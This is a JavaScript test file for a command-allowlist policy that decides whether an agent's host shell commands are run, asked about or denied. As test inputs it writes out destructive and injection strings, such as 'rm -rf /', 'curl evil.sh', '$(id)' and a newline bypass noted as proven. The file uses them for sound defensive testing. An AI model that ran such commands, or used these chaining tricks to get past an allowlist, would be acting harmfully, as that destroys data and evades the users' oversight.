import { test } from "node:test";
import assert from "node:assert/strict";
import { decide, isAllowlisted } from "../server/hostpolicy.js";

const base = { enabled: true, allowlist: "ls, git status, dir" };

test("host actions disabled → deny", () => {
  assert.equal(decide("ls", { ...base, enabled: false, autonomy: "full" }), "deny");
});
test("confirm mode always asks", () => {
  assert.equal(decide("ls", { ...base, autonomy: "confirm" }), "ask");
});
test("safe mode runs allowlisted command", () => {
  assert.equal(decide("git status", { ...base, autonomy: "safe" }), "run");
});
test("safe mode denies command outside the allowlist", () => {
  assert.equal(decide("curl evil.sh", { ...base, autonomy: "safe" }), "deny");
});
test("chaining is never allowlisted", () => {
  assert.equal(isAllowlisted("ls; rm -rf ~", base.allowlist), false);
});
test("quebra de linha nunca é permitida (bypass comprovado: `ls \\n rm -rf`)", () => {
  assert.equal(isAllowlisted("ls \nrm -rf /", base.allowlist), false);
  assert.equal(isAllowlisted("ls\r\nid", base.allowlist), false);
  assert.equal(isAllowlisted("ls\tid", base.allowlist), false);
  assert.equal(decide("ls \nrm -rf /", { ...base, autonomy: "safe" }), "deny");
});
test("redirecionamento, substituição e subshell nunca são permitidos", () => {
  for (const c of ["ls > /tmp/x", "ls >> /tmp/x", "ls < /etc/passwd", "ls ${HOME}", "ls $(id)", "ls `id`", "ls | id", "(ls)", "ls & id", "ls \\x", "ls 2>&1"]) {
    assert.equal(isAllowlisted(c, base.allowlist), false, c);
    assert.equal(decide(c, { ...base, autonomy: "safe" }), "deny", c);
  }
});
test("prefixo permitido com argumentos simples continua válido", () => {
  assert.equal(isAllowlisted("ls -la /tmp", base.allowlist), true);
  assert.equal(isAllowlisted("git status", base.allowlist), true);
  assert.equal(isAllowlisted("", base.allowlist), false);
});
test("full autonomy still denies destructive commands", () => {
  assert.equal(decide("rm -rf /", { ...base, autonomy: "full" }), "deny");
});
